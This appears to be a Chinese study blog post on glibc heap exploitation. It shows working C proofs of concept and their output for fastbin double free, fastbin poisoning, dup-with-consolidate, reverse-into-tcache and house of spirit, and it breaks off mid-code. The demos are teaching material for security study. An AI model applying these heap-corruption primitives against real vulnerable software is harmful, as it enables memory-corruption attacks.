<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* offset      |    size */</span>  type = <span class="keyword">struct</span> malloc_state &#123;</span><br><span class="line"><span class="comment">/* 0x0000      |  0x0004 */</span>    <span class="type">__libc_lock_t</span> mutex;</span><br><span class="line"><span class="comment">/* 0x0004      |  0x0004 */</span>    <span class="type">int</span> flags;</span><br><span class="line"><span class="comment">/* 0x0008      |  0x0004 */</span>    <span class="type">int</span> have_fastchunks;</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0010      |  0x0050 */</span>    mfastbinptr fastbinsY[<span class="number">10</span>];</span><br><span class="line"><span class="comment">/* 0x0060      |  0x0008 */</span>    mchunkptr top;</span><br><span class="line"><span class="comment">/* 0x0068      |  0x0008 */</span>    mchunkptr last_remainder;</span><br><span class="line"><span class="comment">/* 0x0070      |  0x07f0 */</span>    mchunkptr bins[<span class="number">254</span>];</span><br><span class="line"><span class="comment">/* 0x0860      |  0x0010 */</span>    <span class="type">unsigned</span> <span class="type">int</span> binmap[<span class="number">4</span>];</span><br><span class="line"><span class="comment">/* 0x0870      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/* 0x0878      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"><span class="comment">/* 0x0880      |  0x0008 */</span>    <span class="type">size_t</span> attached_threads;</span><br><span class="line"><span class="comment">/* 0x0888      |  0x0008 */</span>    <span class="type">size_t</span> system_mem;</span><br><span class="line"><span class="comment">/* 0x0890      |  0x0008 */</span>    <span class="type">size_t</span> max_system_mem;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes): 2200 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>
<p>如果freelist为空,说明当前没有空闲的分配区,但是哥们急着要用堆块,怎么办呢?
尝试创建一个新的分配区</p>
<p>但也不是一急就得立刻创建新分配区,
这个分配区有一个数量上限,<code>8*核心数</code></p>
<p>如果能够创建,那么就调用<code>_int_new_arena</code>创建新分配区</p>
<p>这个函数会调用<code>new_heap</code>,继而调用<code>alloc_new_heap</code>函数创建一个<code>heap_info</code>结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h = new_heap (size + (<span class="keyword">sizeof</span> (*h) + <span class="keyword">sizeof</span> (*a) + MALLOC_ALIGNMENT), mp_.top_pad);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap_info *h = alloc_new_heap (size, top_pad, mp_.hp_pagesize, mp_.hp_flags);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p2 = (<span class="type">char</span> *) MMAP (aligned_heap_area, max_size, PROT_NONE, mmap_flags);</span><br></pre></td></tr></table></figure>
<p>实际上会调用mmap系统调用向操作系统要一大块空间</p>
<h2 id="exploit-1">exploit</h2>
<h3 id="fastbins">fastbins</h3>
<h4 id="double-free-dup">double free dup</h4>
<p><code>fastbins</code>中对于二次释放的判断很唐氏</p>
<p><code>fastbins</code>只会判断当前正在释放的堆块和挂在桶子头上的第一块是不是相同,
如果是就认为是<code>Double Free</code>了</p>
<p>如果<code>fastbin</code>上这样:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin[idx] =&gt; A =&gt; B =&gt; NULL</span><br></pre></td></tr></table></figure>
<p>此时释放<code>B</code>就可以绕过检查造成<code>Double Free</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin[idx] =&gt; B =&gt; A =&gt; B =&gt; NULL</span><br></pre></td></tr></table></figure>
<p>这又有个问题,使用<code>malloc</code>申请内存时</p>
<p>如果<code>tcachebins</code>中有东西,那么<code>malloc</code>会从<code>tcache</code>中拿,不会拿<code>fastbins</code>的</p>
<p>但是如果<code>tcachebins</code>中没东西,那么当从<code>fastbins</code>中拿一个之后,剩下的都会被放到<code>tcachebins</code>中</p>
<p>为了避免<code>tcache</code>抢东西,可以使用<code>calloc</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc	//此处首先尝试从tcache获取堆块</span><br><span class="line">	_int_malloc			//此处尝试从斌家获取</span><br><span class="line">	</span><br><span class="line">calloc =&gt; __libc_malloc	//不使用tcache,直接调用_int_malloc</span><br><span class="line">	_int_malloc			//此处尝试从斌家获取,但是如果tcache不满,还是会抢斌家的填满tcache</span><br></pre></td></tr></table></figure>
<p>为了避免<code>tcache</code>造成影响,可以首先将<code>tcache</code>填满,目的是在斌家分配一次后,避免剩余的堆块进入<code>tcache</code></p>
<p>然后使用<code>calloc</code>函数分配,目的是避免从<code>tcache</code>中取堆块</p>
<p>写个<code>exp</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf this time will establish a write buffer\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *A;</span><br><span class="line">    <span class="type">size_t</span> *B;</span><br><span class="line">    <span class="type">size_t</span> *C;</span><br><span class="line">    <span class="comment">// size_t *barrier;        </span></span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;       </span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;       <span class="comment">//fill tcache</span></span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(B);                    <span class="comment">//next free to fastbin</span></span><br><span class="line">    <span class="built_in">free</span>(A);</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; B =&gt; A =&gt; B</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    B = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);           <span class="comment">//next malloc from fastbin</span></span><br><span class="line">    A = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line">    C = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;B: %p\n&quot;</span>, B);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A: %p\n&quot;</span>, A);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;C: %p\n&quot;</span>, C);</span><br><span class="line">    assert(B == C);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins# make</span><br><span class="line">gcc -w -g -o fastbin_dup fastbin_dup.c -o fastbin_dup</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins# ./fastbin_dup</span><br><span class="line"><span class="built_in">printf</span> this time will establish a write buffer</span><br><span class="line">B: 0x55dd112b2700</span><br><span class="line">A: 0x55dd112b26b0</span><br><span class="line">C: 0x55dd112b2700</span><br></pre></td></tr></table></figure>
<h4 id="poison">poison</h4>
<p>利用<code>Double Free</code>,或者其他手段,
使得堆管理器持有某个堆块指针的同时, 我们也持有一个</p>
<p>此时我们利用这个指针进行<code>Use After Free</code>,
对该已经释放的堆块进行写入操作, 覆盖该堆块的元数据,
修改<code>fd</code>指针指向任意地址</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> sz  0x40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> prev_size;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span>* fd;</span><br><span class="line">    <span class="type">size_t</span>* bk;</span><br><span class="line">&#125;malloc_chunk;</span><br><span class="line"></span><br><span class="line">malloc_chunk fake_chunk=&#123;</span><br><span class="line">    .prev_size = <span class="number">0</span>,</span><br><span class="line">    .size = (sz + <span class="number">0x10</span>) | <span class="number">1</span>,</span><br><span class="line">    .fd = <span class="number">0</span>,</span><br><span class="line">    .bk = <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf this time will establish a write buffer\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> * tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> * A;</span><br><span class="line">    <span class="type">size_t</span> * B;</span><br><span class="line">    <span class="type">size_t</span> * C;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(sz);</span><br><span class="line">    &#125;</span><br><span class="line">    A = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(sz);</span><br><span class="line">    B = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(sz);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;           <span class="comment">//fill tcache</span></span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(A);                        <span class="comment">//free to fastbin</span></span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    <span class="built_in">free</span>(A);</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; A =&gt; B =&gt; A</span></span><br><span class="line"></span><br><span class="line">    A = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    B = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; A</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> * fake_chunk_mem = (<span class="type">char</span>*)&amp;fake_chunk + <span class="number">0x10</span>;</span><br><span class="line">    A[<span class="number">0</span>] = ((<span class="type">size_t</span>)A &gt;&gt; <span class="number">12</span>) ^ (<span class="type">size_t</span>)&amp;fake_chunk;</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; A =&gt; fake_chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk_mem = %p\n&quot;</span>, fake_chunk_mem);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A = %p\n&quot;</span>, A);</span><br><span class="line">    A = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A = %p\n&quot;</span>, A);</span><br><span class="line">    C = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;C = %p\n&quot;</span>, C);</span><br><span class="line">    assert(C == fake_chunk_mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# make</span><br><span class="line">gcc -w -g -o fastbin_poison fastbin_poison.c -o fastbin_poison</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./fastbin_poison</span><br><span class="line"><span class="built_in">printf</span> this time will establish a write buffer</span><br><span class="line">fake_chunk_mem = 0x55d7ebf53030</span><br><span class="line">A = 0x55d7ed23d8e0</span><br><span class="line">A = 0x55d7ed23d8e0</span><br><span class="line">C = 0x55d7ebf53030</span><br></pre></td></tr></table></figure>
<h4 id="dup_with_consolidate">dup_with_consolidate</h4>
<p>0.填充<code>tcache</code></p>
<p>1.找一个与<code>topchunk</code>相邻的小堆块,<code>free</code>进入<code>fastbins</code>,==并继续持有其指针==</p>
<p>2.发起<code>0x400</code>字节的分配申请,导致<code>malloc_consolidate</code>,使得<code>fastbins</code>中的堆块合并到<code>topchunk</code>,然后本次申请拿到同一个指针,但是堆块大小变成了<code>0x411</code>(包括元数据,标志位和用户空间)</p>
<p>3.<code>free</code>小堆块的野指针,这实际上会导致大块被释放进入<code>unsortedbin</code></p>
<p>4.再次发起<code>0x400</code>字节的分配申请,再次拿到同一个堆块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;this printf will establish the write buffer\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> * tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> * A;</span><br><span class="line">    <span class="type">size_t</span> * B;</span><br><span class="line">    <span class="type">size_t</span> * C;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;++i)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x40</span>);           <span class="comment">//malloc a chunk next to the topchunk</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;++i)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]); <span class="comment">//fill the tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// A = calloc(1,0x40);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A:%p\n&quot;</span>,A);</span><br><span class="line">    <span class="built_in">free</span>(A);                    <span class="comment">//return A back to fastbins</span></span><br><span class="line"></span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x400</span>);          <span class="comment">//cause a malloc_consolidate , merge A with the topchunk , then malloc B with the same address of A</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;B:%p\n&quot;</span>,B);</span><br><span class="line">    assert(A == B);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(A);                    <span class="comment">//double free A , then B will be free</span></span><br><span class="line"></span><br><span class="line">    C = <span class="built_in">malloc</span>(<span class="number">0x400</span>);          <span class="comment">//malloc C at the same address of B </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;C:%p\n&quot;</span>,C);</span><br><span class="line">    assert(C == B);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./fastbin_dup_consolidate</span><br><span class="line">this <span class="built_in">printf</span> will establish the write buffer</span><br><span class="line">A:<span class="number">0x563058c578e0</span></span><br><span class="line">B:<span class="number">0x563058c578e0</span></span><br><span class="line">C:<span class="number">0x563058c578e0</span></span><br></pre></td></tr></table></figure>
<p>特点是不需要<code>calloc</code></p>
<h4 id="reverse_into_tcache">reverse_into_tcache</h4>
<p>如果<code>fastbin</code>中有多于一个堆块,<code>tcache</code>空</p>
<p>那么从该<code>fastbin</code>中拿一个堆块时,首先会把<code>tcache</code>填满,然后再从<code>tcache</code>中拿出一个堆块来</p>
<p>并且<code>fastbin</code>和<code>tcache</code>都是链栈结构</p>
<p>这会导致<code>fastbin</code>中的堆块连接顺序反过来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fastbins[idx]-&gt;1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6-&gt;7</span><br><span class="line"></span><br><span class="line">tcachebins[idx]-&gt;7-&gt;6-&gt;5-&gt;4-&gt;3-&gt;2-&gt;1</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123; </span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *fastbin_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">int</span> usable_size = <span class="number">0x10</span>;</span><br><span class="line">    <span class="type">int</span> chunk_size = ( usable_size + <span class="number">0x10</span> ) | <span class="number">1</span>;</span><br><span class="line">    <span class="type">size_t</span> fake_chunk[<span class="number">7</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk,<span class="number">0x3c</span>,<span class="keyword">sizeof</span>(fake_chunk));</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;++i)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(usable_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        fastbin_chunks[i] = <span class="built_in">malloc</span>(usable_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(fastbin_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    *fastbin_chunks[<span class="number">0</span>] = ((<span class="type">size_t</span>)fastbin_chunks[<span class="number">0</span>] &gt;&gt; <span class="number">12</span>) ^ ((<span class="type">size_t</span>)&amp;fake_chunk);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(usable_size);     <span class="comment">//empty tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">malloc</span>(usable_size);            <span class="comment">//reverse fastbin into tcache</span></span><br><span class="line">    victim = <span class="built_in">malloc</span>(usable_size);   <span class="comment">//get stack address</span></span><br><span class="line">    assert(victim == (<span class="type">size_t</span>*)&amp;fake_chunk[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc fastbin_reverse_into_tcache.c -o fastbin_reverse_into_tcache -w -g</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./fastbin_reverse_into_tcache</span><br></pre></td></tr></table></figure>
<h4 id="house_of_mind">house_of_mind</h4>
<p>不会</p>
<h4 id="house_of_spirit">house_of_spirit</h4>
<p>任意堆块释放进入<code>fastbin</code></p>
<p>构造假堆块时需要注意物理上相邻的下一个堆块的<code>prev_size</code>字段</p>
<p>这里有一个检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">   getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (!have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    __libc_lock_lock(av-&gt;mutex);</span><br><span class="line">    fail = (chunksize_nomask(chunk_at_offset(p, size)) &lt;= CHUNK_HDR_SZ || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">    __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fail)</span><br><span class="line">    malloc_printerr(<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过检查的条件是:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.nextchunk.prev_size &gt; chunk_hdr_sz (0x10)</span><br><span class="line">2.nextchunk.prev_size &lt; av-&gt;system_mem (整个堆区的大小,可能是0x21000)</span><br></pre></td></tr></table></figure>
<p>不需要和<code>fake_chunk.size</code>设置相同,只需要满足上述两个条件即可</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span 